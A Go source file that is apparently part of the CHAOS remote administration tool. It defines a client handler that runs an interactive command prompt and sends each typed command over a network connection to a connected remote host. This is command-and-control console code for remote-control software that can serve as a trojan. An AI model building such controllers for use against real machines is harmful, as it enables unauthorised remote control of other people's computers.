package client

import (
	"fmt"
	"github.com/c-bata/go-prompt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/handler"
	"github.com/tiagorlampert/CHAOS/internal/ui/completer"
	"github.com/tiagorlampert/CHAOS/pkg/system"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"net"
	"strings"
)

type ClientHandler struct {
	Connection net.Conn
}

func NewClientHandler(conn net.Conn) handler.Client {
	return &ClientHandler{
		Connection: conn,
	}
}

func (c ClientHandler) HandleConnection(hostname, user string) {
	p := prompt.New(
		c.executor,
		completer.ClientCompleter,
		prompt.OptionPrefix(fmt.Sprintf("%s@%s > ", hostname, user)),
		prompt.OptionPrefixTextColor(prompt.White),
	)
	p.Run()
}

func (c ClientHandler) executor(input string) {
	values := strings.Fields(input)
	for _, v := range values {
		switch strings.TrimSpace(v) {
		case "exit":
			system.QuitApp()
		default:
			if err := Write(c.Connection, input); err != nil {
				log.WithField("cause", err.Error()).Error("error sending command to client")
			}
			return
		}
	}
}

func Write(conn net.Conn, v string) error {
	_, err := conn.Write([]byte(v + util.DelimiterString))
	return err
}
